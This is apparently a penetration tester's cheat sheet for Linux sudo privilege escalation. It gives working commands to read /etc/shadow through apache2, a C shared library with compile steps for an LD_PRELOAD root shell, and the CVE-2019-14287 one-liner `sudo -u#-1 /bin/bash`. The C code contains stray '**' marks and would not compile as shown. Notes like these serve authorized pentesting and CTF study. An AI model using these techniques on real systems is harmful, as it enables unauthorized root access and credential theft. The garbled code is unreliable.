```bash
sudo -l
```
Shows list of sudo commands you can run without password
## Sudo Shell Escaping
https://gtfobins.github.io/
GTFO Bins provides ways to gain root shell using commands that you have sudo perms for

## Intended Functionality Escalation
Google search `command sudo privilege escalation`
Example:
`sudo apache privilege escalation`

Apache can't run as root, but it does give read access to all files
```bash
sudo apache2 -f /etc/shadow
```

## LD_PRELOAD
Loads library before all other libraries

Save file as x.c:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    **unsetenv("LD_PRELOAD");
    **setgid(0);
    **setuid(0);
    **system("/bin/bash");
}
```

run the following after saving the above file:
```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
```

Finally, run LD_PRELOAD with a command you have sudo perms for, this example we can sudo apache2
```bash
sudo LD_PRELOAD=/tmp/x.so apache2
```

## sudo 1.8.27 (CVE-2019-14287)
https://www.exploit-db.com/exploits/47502

```bash
sudo -u#-1 /bin/bash
```

## sudo < 1.8.26 (CVE-2019-18634)
https://github.com/saleemrashid/sudo-cve-2019-18634

pwfeedback must be enabled (run `sudo su -` and check to see if asterisks show when you type a password)